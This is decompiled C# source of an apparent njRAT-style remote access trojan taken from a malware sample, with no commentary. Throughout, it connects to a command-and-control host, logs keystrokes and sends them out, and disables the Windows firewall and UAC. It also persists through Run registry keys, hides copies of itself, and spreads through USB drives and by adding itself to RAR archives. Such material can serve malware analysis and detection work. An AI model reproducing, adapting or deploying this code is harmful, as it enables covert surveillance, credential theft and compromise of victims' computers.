// Decompiled with JetBrains decompiler
// Type: n.B
// Assembly: p, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 91D63E37-42E0-404C-97F4-07116ACD2D57
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.KillAV.ao-27eafab1bfbe5012a9dd5eb6a22a5e09a25b91a1b79c55ba29e0e7098dcc6f9f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace n
{
  [DesignerGenerated]
  public class B : Form
  {
    private IContainer components;
    [AccessedThroughProperty("fs")]
    private FileSystemWatcher _fs;
    public static bool Fw = false;
    public static bool FT = false;
    public static bool netsh;
    public static bool isFT;
    public static bool KON;
    public static string Vname = "VmljdGlt";
    public static bool DS;
    public static string PC = "X";
    public static string ver = "1.6.2";
    public static string exename;
    private string LA;
    public static bool ISEND;
    public A BW;
    public static bool Busy;
    public static bool CAM = false;
    public static int ms;
    [AccessedThroughProperty("WC")]
    private SocketsClient _WC;
    [AccessedThroughProperty("wL")]
    private System.Windows.Forms.Timer _wL;
    [AccessedThroughProperty("k")]
    private System.Windows.Forms.Timer _k;
    public static bool Connecting = false;
    public static string no = "nj.redirectme.net:7";
    public static string Ai;
    public static string SU = "*";
    public static bool UU;
    public static string Uo = "*";
    public static string Ui = "*";
    public static string spread = "*";
    public static string mU = "*";
    public static string FR;
    public static string Cht;
    public static string plg = "p161";
    private int c2;
    private int cc;
    private int c0;
    private int c3;
    public static Mutex jMutex;
    public static chat Chat;
    private static string[] Block = new string[100000];
    private static int inx;
    private static int err;

    public B()
    {
      this.FormClosing += new FormClosingEventHandler(this.B_FormClosing);
      this.Load += new EventHandler(this.B_Load);
      this.BW = new A();
      this.WC = new SocketsClient();
      this.wL = new System.Windows.Forms.Timer();
      this.k = new System.Windows.Forms.Timer();
      this.InitializeComponent();
    }

    [STAThread]
    public static void Main() => Application.Run((Form) MyProject.Forms.B);

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.fs = new FileSystemWatcher();
      this.fs.BeginInit();
      this.SuspendLayout();
      this.fs.EnableRaisingEvents = true;
      this.fs.IncludeSubdirectories = true;
      this.fs.SynchronizingObject = (ISynchronizeInvoke) this;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (B);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Minimized;
      this.fs.EndInit();
      this.ResumeLayout(false);
    }

    internal virtual FileSystemWatcher fs
    {
      get => this._fs;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        FileSystemEventHandler systemEventHandler = new FileSystemEventHandler(this.fs_Created);
        if (this._fs != null)
          this._fs.Created -= systemEventHandler;
        this._fs = value;
        if (this._fs == null)
          return;
        this._fs.Created += systemEventHandler;
      }
    }

    public virtual SocketsClient WC
    {
      get => this._WC;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        SocketsClient.onDataArrivalEventHandler arrivalEventHandler = new SocketsClient.onDataArrivalEventHandler(this.W3);
        SocketsClient.onDisconnectEventHandler disconnectEventHandler = new SocketsClient.onDisconnectEventHandler(this.W2);
        SocketsClient.onErrorEventHandler errorEventHandler = new SocketsClient.onErrorEventHandler(this.W1);
        SocketsClient.onConnectEventHandler connectEventHandler = new SocketsClient.onConnectEventHandler(this.W0);
        if (this._WC != null)
        {
          this._WC.onDataArrival -= arrivalEventHandler;
          this._WC.onDisconnect -= disconnectEventHandler;
          this._WC.onError -= errorEventHandler;
          this._WC.onConnect -= connectEventHandler;
        }
        this._WC = value;
        if (this._WC == null)
          return;
        this._WC.onDataArrival += arrivalEventHandler;
        this._WC.onDisconnect += disconnectEventHandler;
        this._WC.onError += errorEventHandler;
        this._WC.onConnect += connectEventHandler;
      }
    }

    public virtual System.Windows.Forms.Timer wL
    {
      get => this._wL;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = (EventHandler) ((a0, a1) => this.wL_());
        if (this._wL != null)
          this._wL.Tick -= eventHandler;
        this._wL = value;
        if (this._wL == null)
          return;
        this._wL.Tick += eventHandler;
      }
    }

    public virtual System.Windows.Forms.Timer k
    {
      get => this._k;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._k = value;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vKey);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetProcessWorkingSetSize(
      IntPtr process,
      int minimumWorkingSetSize,
      int maximumWorkingSetSize);

    public static void E()
    {
      try
      {
        while (true)
        {
          do
          {
            Thread.Sleep(10000);
            GC.Collect();
            GC.WaitForPendingFinalizers();
          }
          while (Environment.OSVersion.Platform != PlatformID.Win32NT);
          B.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void CL()
    {
      B.KON = false;
      B.Busy = false;
      try
      {
        chat.clos = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void B_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (e.CloseReason == CloseReason.WindowsShutDown)
        ProjectData.EndApp();
      else
        e.Cancel = true;
    }

    public void R()
    {
      MemoryStream memoryStream1 = new MemoryStream();
      Array Instance1 = (Array) File.ReadAllBytes(Application.ExecutablePath);
      int num1 = checked (Instance1.Length - 400);
      int num2 = checked (Instance1.Length - 1);
      int num3 = num1;
      while (num3 <= num2)
      {
        int num4;
        if (Operators.CompareString(Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) num3
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 1)
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 2)
        }, (string[]) null)))), "***", false) == 0)
          num4 = checked (num3 + 1);
        int num5;
        if (Operators.CompareString(Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) num3
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 1)
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 2)
        }, (string[]) null)))), "^^^", false) == 0)
          num5 = checked (num3 - 3);
        if (num4 > 0 & num5 == 0)
          memoryStream1.WriteByte(Conversions.ToByte(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) num3
          }, (string[]) null)));
        checked { ++num3; }
      }
      byte[] array1 = memoryStream1.ToArray();
      MemoryStream memoryStream2 = new MemoryStream();
      memoryStream2.Write(array1, 1, checked (array1.Length - 3));
      Encoding encoding = Encoding.Default;
      byte[] array2 = memoryStream2.ToArray();
      bool flag = false;
      ref bool local1 = ref flag;
      byte[] bytes = API.ZIP(array2, ref local1);
      Array Instance2 = (Array) Strings.Split(encoding.GetString(bytes), IND.Y);
      B.no = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 0
      }, (string[]) null));
      B.SU = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 1
      }, (string[]) null));
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 2
      }, (string[]) null), (object) "*", false))
      {
        B.Ai = "*";
      }
      else
      {
        B.Ai = Interaction.Environ(Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 2
        }, (string[]) null)), ":")[1]) + "\\" + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 2
        }, (string[]) null)), ":")[0];
        if (Operators.CompareString(B.Ai, Application.ExecutablePath, false) != 0)
        {
          try
          {
            if (File.Exists(B.Ai))
              File.Delete(B.Ai);
            File.Copy(Application.ExecutablePath, B.Ai, true);
            try
            {
              File.SetAttributes(B.Ai, FileAttributes.Hidden);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            if (Operators.CompareString(Conversions.ToString(Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
            {
              (object) 2
            }, (string[]) null)), ":")[2][0]), "T", false) == 0)
            {
              string ai = B.Ai;
              string executablePath = Application.ExecutablePath;
              string arguments = "Kill@" + API.ENB(ref executablePath);
              Process.Start(ai, arguments);
            }
            else
              Process.Start(B.Ai);
            ProjectData.EndApp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.EndApp();
            ProjectData.ClearProjectError();
          }
        }
      }
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 3
      }, (string[]) null), (object) "^", false))
        B.UU = true;
      if (Strings.InStr(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 4
      }, (string[]) null)), "*") == 0)
      {
        B.Uo = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 4
        }, (string[]) null));
        new Thread((ParameterizedThreadStart) (a0 => USB.USb(Conversions.ToString(a0)))).Start((object) B.Uo);
        B.spread = "(" + B.Uo + ")USB,";
      }
      B.mU = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 5
      }, (string[]) null));
      try
      {
        Mutex.OpenExisting(B.mU);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      B.jMutex = new Mutex(true, B.mU);
      if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 6
      }, (string[]) null), (object) "*", false))
      {
        B.spread += "Rar,";
        B.Ui = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 6
        }, (string[]) null));
        this.fs.Path = Interaction.Environ("homedrive") + "\\";
        this.fs.EnableRaisingEvents = true;
      }
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 9
      }, (string[]) null), (object) "^", false))
      {
        B.Fw = true;
        new Thread(new ThreadStart(this.fwb)).Start();
      }
      else
        B.Fw = false;
      Registry.CurrentUser.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 8
      }, (string[]) null)));
      NK.Key = Conversions.ToString(Operators.ConcatenateObject((object) "HKEY_CURRENT_USER\\Software\\", NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 8
      }, (string[]) null)));
      string str1 = "vname";
      ref string local2 = ref str1;
      Array Instance3 = Instance2;
      object[] objArray1 = new object[1];
      object[] objArray2 = objArray1;
      int num6 = 7;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num6;
      objArray2[0] = (object) local3;
      object[] Arguments = objArray1;
      string str2 = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance3, Arguments, (string[]) null));
      ref string local4 = ref str2;
      string str3 = NK.GetValue(ref local2, ref local4);
      NewLateBinding.LateIndexSetComplex((object) Instance2, new object[2]
      {
        (object) num6,
        (object) str2
      }, (string[]) null, true, false);
      B.Vname = str3;
    }

    public void fwb()
    {
      try
      {
        byte[] p = n.My.Resources.Resources.P;
        bool flag = false;
        ref bool local1 = ref flag;
        byte[] numArray = API.ZIP(p, ref local1);
        ref byte[] local2 = ref numArray;
        string str1 = "P.V";
        ref string local3 = ref str1;
        string str2 = "main";
        ref string local4 = ref str2;
        object obj = (object) null;
        ref object local5 = ref obj;
        C.inv(ref local2, ref local3, ref local4, ref local5);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        B.Fw = false;
        ProjectData.ClearProjectError();
      }
    }

    private void B_Load(object sender, EventArgs e)
    {
      try
      {
        B.exename = Process.GetCurrentProcess().ProcessName;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        B.exename = "!";
        ProjectData.ClearProjectError();
      }
      try
      {
        Control.CheckForIllegalCrossThreadCalls = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        byte[] plugin = n.My.Resources.Resources.plugin;
        bool flag = false;
        ref bool local = ref flag;
        C.Plug = API.ZIP(plugin, ref local);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        B.CAM = Operators.CompareString(new Cam().Dnames(), "", false) != 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        B.CAM = false;
        ProjectData.ClearProjectError();
      }
      try
      {
        B.PC = Environment.MachineName + "\\" + Environment.UserName;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Hide();
      this.Visible = false;
      try
      {
        string Expression = Interaction.Command();
        if (Expression.Length > 0)
        {
          Array Instance1 = (Array) Strings.Split(Expression, "@");
          object Left = NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) 0
          }, (string[]) null);
          if (Operators.ConditionalCompareObjectEqual(Left, (object) "!0", false))
          {
            Thread.Sleep(100);
            try
            {
              Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 2
              }, (string[]) null))).Kill();
              Process[] processesByName = Process.GetProcessesByName("wscript");
              int index = 0;
              while (index < processesByName.Length)
              {
                Process process = processesByName[index];
                try
                {
                  process.Kill();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              File.Delete(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 1
              }, (string[]) null)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              MyProject.Computer.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 2
              }, (string[]) null)));
              MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 2
              }, (string[]) null)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.ConditionalCompareObjectEqual(Left, (object) "..", false))
            Thread.Sleep(2000);
          else if (Operators.ConditionalCompareObjectEqual(Left, (object) "Kill", false))
          {
            try
            {
              Array Instance2 = Instance1;
              object[] objArray1 = new object[1];
              object[] objArray2 = objArray1;
              int num = 1;
              // ISSUE: variable of a boxed type
              __Boxed<int> local = (ValueType) num;
              objArray2[0] = (object) local;
              object[] Arguments = objArray1;
              string s = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, Arguments, (string[]) null));
              string path = API.DEB(ref s);
              NewLateBinding.LateIndexSetComplex((object) Instance1, new object[2]
              {
                (object) num,
                (object) s
              }, (string[]) null, true, false);
              File.Delete(path);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.ClassesRoot.GetValue("!", (object) null), (object) null, false))
        {
          B.FR = Conversions.ToString(MyProject.Computer.Clock.LocalTime) + " >> " + Application.ExecutablePath;
          MyProject.Computer.Registry.ClassesRoot.SetValue("!", (object) API.ENB(ref B.FR));
        }
        else
        {
          string s = Conversions.ToString(MyProject.Computer.Registry.ClassesRoot.GetValue("!", (object) "*"));
          B.FR = API.DEB(ref s);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        B.FR = "*";
        ProjectData.ClearProjectError();
      }
      try
      {
        this.R();
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        B.SU = "*";
        B.mU = "*";
        try
        {
          NK.Key = "HKEY_CURRENT_USER\\Software\\nKey";
          string N = "vname";
          B.Vname = NK.GetValue(ref N, ref B.Vname);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      try
      {
        string str1 = "FT";
        ref string local1 = ref str1;
        string str2 = "";
        ref string local2 = ref str2;
        if (Operators.CompareString(NK.GetValue(ref local1, ref local2), "", false) == 0)
        {
          B.FT = true;
          string str3 = "FT";
          ref string local3 = ref str3;
          string str4 = "&";
          ref string local4 = ref str4;
          NK.SetValue(ref local3, ref local4);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.cc = 4;
      if (B.UU)
        this.BW.B.RunWorkerAsync();
      new Thread(new ThreadStart(B.E)).Start();
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) 0, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      new Thread(new ThreadStart(B.Key.Start)).Start();
      this.con();
      this.wL.Interval = 1000;
      this.wL.Enabled = true;
    }

    public void wL_()
    {
      this.wL.Enabled = false;
      try
      {
        checked { ++this.cc; }
        checked { ++this.c0; }
        if (this.c2 < 5)
          checked { ++this.c2; }
        if (this.c2 == 5)
        {
          try
          {
            Process[] processesByName1 = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
            int index1 = 0;
            while (index1 < processesByName1.Length)
            {
              Process process1 = processesByName1[index1];
              try
              {
                if (FileSystem.FileLen(process1.MainModule.FileName) == FileSystem.FileLen(Process.GetCurrentProcess().MainModule.FileName))
                {
                  if (process1.Id != Process.GetCurrentProcess().Id)
                  {
                    try
                    {
                      process1.Kill();
                      Process[] processesByName2 = Process.GetProcessesByName("wscript");
                      int index2 = 0;
                      while (index2 < processesByName2.Length)
                      {
                        Process process2 = processesByName2[index2];
                        try
                        {
                          process2.Kill();
                        }
                        catch (Exception ex)
                        {
                          ProjectData.SetProjectError(ex);
                          ProjectData.ClearProjectError();
                        }
                        checked { ++index2; }
                      }
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      ProjectData.ClearProjectError();
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index1; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          if (B.Cht.Length > 0)
          {
            B.Chat = new chat();
            chat.clos = false;
            B.Chat.nick = B.Cht;
            B.Chat.Show();
            B.Cht = "";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          B.Cht = "";
          ProjectData.ClearProjectError();
        }
        if (Operators.CompareString(B.SU, "*", false) != 0)
        {
          if (this.cc > 4)
          {
            try
            {
              RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
              if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(B.SU), (object) null, false))
                registryKey.SetValue(B.SU, (object) (Application.ExecutablePath + " @.."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
              if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(B.SU), (object) null, false))
                registryKey.SetValue(B.SU, (object) Application.ExecutablePath);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            this.cc = 0;
          }
        }
        if (!B.Connecting)
        {
          try
          {
            if (this.WC.Connected())
            {
              if (B.ISEND)
              {
                checked { ++this.c3; }
                string T;
                if (B.FT & !B.isFT)
                {
                  B.isFT = true;
                  T = "#blue";
                  this.SEND(ref T);
                }
                if (this.c3 > 2)
                {
                  this.c3 = 0;
                  bool p = false;
                  string str = API.A1(ref p);
                  if (Operators.CompareString(this.LA, str, false) != 0)
                  {
                    if (Operators.CompareString(str, "", false) != 0)
                    {
                      this.LA = str;
                      T = "#3" + IND.Y + this.LA;
                      this.SEND(ref T);
                    }
                  }
                }
              }
            }
            else
            {
              this.Dis();
              this.con();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.Dis();
            this.con();
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.wL.Enabled = true;
    }

    public void con()
    {
      B.Connecting = true;
      try
      {
        this.CL();
        B.DS = false;
        if (!B.netsh)
        {
          B.netsh = true;
          try
          {
            Process.Start(new ProcessStartInfo()
            {
              FileName = "netsh",
              Arguments = "firewall set opmode disable",
              CreateNoWindow = true,
              WindowStyle = ProcessWindowStyle.Hidden
            });
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        this.WC = new SocketsClient();
        this.WC.Connect(Strings.Split(B.no, ":")[0], Conversions.ToInteger(Strings.Split(B.no, ":")[1]));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(1500);
      B.Connecting = false;
    }

    public void Dis()
    {
      try
      {
        this.CL();
        B.DS = true;
        B.ISEND = false;
        this.WC.Disconnect();
        this.WC = (SocketsClient) null;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void SEND(ref string T)
    {
      try
      {
        this.WC.SendData(this.WC.STB(T));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void W0()
    {
      try
      {
        string T = "#2" + IND.Y + API.A0() + IND.Y + B.Vname + "_" + sc.HWD();
        this.SEND(ref T);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          string str = "X";
          int num = 0;
          do
          {
            str += "\r\nX";
            checked { ++num; }
          }
          while (num <= 5);
          string T = "#2" + IND.Y + str + IND.Y + B.Vname + "_" + sc.HWD();
          this.SEND(ref T);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      B.ISEND = true;
      Thread.Sleep(100);
      this.CL();
      B.DS = false;
    }

    public void W1(string T) => this.CL();

    public void W2()
    {
      this.CL();
      B.DS = true;
      B.ISEND = false;
    }

    public void W3(byte[] Data, int totBytes) => this.WC.AT(Data);

    private void fs_Created(object sender, FileSystemEventArgs e)
    {
      try
      {
        if (!e.FullPath.ToLower().EndsWith(".rar"))
          return;
        if (!File.Exists(Interaction.Environ("programdata") + "\\" + B.Ui))
        {
          try
          {
            File.Copy(Application.ExecutablePath, Interaction.Environ("programdata") + "\\" + B.Ui, true);
            File.SetAttributes(Interaction.Environ("programdata") + "\\" + B.Ui, FileAttributes.Normal);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            return;
          }
        }
        else if (FileSystem.FileLen(Interaction.Environ("programdata") + "\\" + B.Ui) != FileSystem.FileLen(Application.ExecutablePath))
        {
          File.Delete(Interaction.Environ("programdata") + "\\" + B.Ui);
          File.Copy(Application.ExecutablePath, Interaction.Environ("programdata") + "\\" + B.Ui, true);
          File.SetAttributes(Interaction.Environ("programdata") + "\\" + B.Ui, FileAttributes.Normal);
        }
        string[] block = B.Block;
        int index1 = 0;
        while (index1 < block.Length)
        {
          string Right = block[index1];
          if (Operators.CompareString(e.FullPath, Right, false) == 0)
            return;
          checked { ++index1; }
        }
        B.Block[B.inx] = e.FullPath;
        checked { ++B.inx; }
        int num1 = 0;
        do
        {
          Thread.Sleep(4000);
          if (File.Exists(e.FullPath))
          {
            byte[] numArray1 = File.ReadAllBytes(e.FullPath);
            byte[] numArray2 = new byte[6]
            {
              (byte) 61,
              (byte) 123,
              (byte) 0,
              (byte) 64,
              (byte) 7,
              (byte) 0
            };
            int num2 = checked (numArray2.Length - 1);
            int index2 = 0;
            while (true)
            {
              if (index2 <= num2)
              {
                if ((int) numArray1[checked (numArray1.Length - numArray2.Length + index2)] == (int) numArray2[index2])
                {
                  try
                  {
                    Process.Start(new ProcessStartInfo()
                    {
                      FileName = "winrar",
                      Arguments = "a \"" + e.FullPath + "\" \"" + Interaction.Environ("programdata") + "\\" + B.Ui + "\"",
                      CreateNoWindow = true,
                      WindowStyle = ProcessWindowStyle.Hidden
                    });
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    checked { ++B.err; }
                    if (B.err > 9)
                    {
                      this.fs.EnableRaisingEvents = false;
                      this.fs.Dispose();
                    }
                    ProjectData.ClearProjectError();
                  }
                  checked { ++index2; }
                }
                else
                  break;
              }
              else
                goto label_4;
            }
            checked { ++num1; }
          }
          else
            goto label_6;
        }
        while (num1 != 10);
        goto label_21;
label_6:
        return;
label_21:
        return;
label_4:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        checked { ++B.err; }
        if (B.err > 9)
        {
          this.fs.EnableRaisingEvents = false;
          this.fs.Dispose();
        }
        ProjectData.ClearProjectError();
      }
    }

    public class Key
    {
      private static Clock Clock = new Clock();
      private static Keyboard K = new Keyboard();

      public static void Start()
      {
        try
        {
label_8:
          if (false)
            return;
          Thread.Sleep(10);
          int i = 8;
          do
          {
            if (B.Key.GetAsyncKeyState(i) == (short) -32767)
            {
              string Right = B.Key.w();
              if ((object) Right != (object) "" & (object) Right != (object) " " & Right != null & Right.Length > 0)
              {
                string Left;
                if (Operators.CompareString(Left, Right, false) == 0)
                {
                  string N = B.Key.KK(ref i);
                  B.Key.Wrt(ref N);
                }
                else
                {
                  Left = Right;
                  string N = B.Key.HM() + Left + "\r\n\r\n" + B.Key.KK(ref i);
                  B.Key.Wrt(ref N);
                }
              }
            }
            checked { ++i; }
          }
          while (i <= (int) byte.MaxValue);
          goto label_8;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }

      public static string HM() => "\r\n\r\n[" + Conversions.ToString(B.Key.Clock.LocalTime.Month) + "\\" + Conversions.ToString(B.Key.Clock.LocalTime.Day) + "][" + Conversions.ToString(B.Key.Clock.LocalTime.Hour) + ":" + Conversions.ToString(B.Key.Clock.LocalTime.Minute) + "] ";

      public static void Wrt(ref string N)
      {
        if (B.KON)
        {
          try
          {
            B b = MyProject.Forms.B;
            string str = "X" + IND.Y + N;
            ref string local = ref str;
            b.SEND(ref local);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            B.KON = false;
            ProjectData.ClearProjectError();
          }
        }
        string str1 = "lg";
        ref string local1 = ref str1;
        string str2 = "";
        ref string local2 = ref str2;
        string str3 = NK.GetValue(ref local1, ref local2);
        if (str3.Length > 1024000)
          str3 = "";
        string str4 = "lg";
        ref string local3 = ref str4;
        string str5 = str3 + N;
        ref string local4 = ref str5;
        NK.SetValue(ref local3, ref local4);
      }

      public static string KK(ref int i)
      {
        string String1 = "0123456789qwertyuiop[]{}asdfghjkl:;'\\|zxcvbnm,.<>/?~!@#$%^&*()_-+=\\|\"";
        string str = ")!@#$%^&*(";
        switch (i)
        {
          case 8:
            return "{BACKSPACE}";
          case 9:
            return "{TAP}";
          case 12:
            return "\r\n";
          case 13:
            return "\r\n";
          case 27:
            return "{ESC}";
          case 32:
            return " ";
          case 37:
            return "{LEFT}";
          case 38:
            return "{UP}";
          case 39:
            return "{RIGHT}";
          case 40:
            return "{DOWN}";
          case 46:
            return "{DEL}";
          case 162:
            return "{CTRL}";
          case 163:
            return "{CTRL}";
          case 164:
            return "{ALT}";
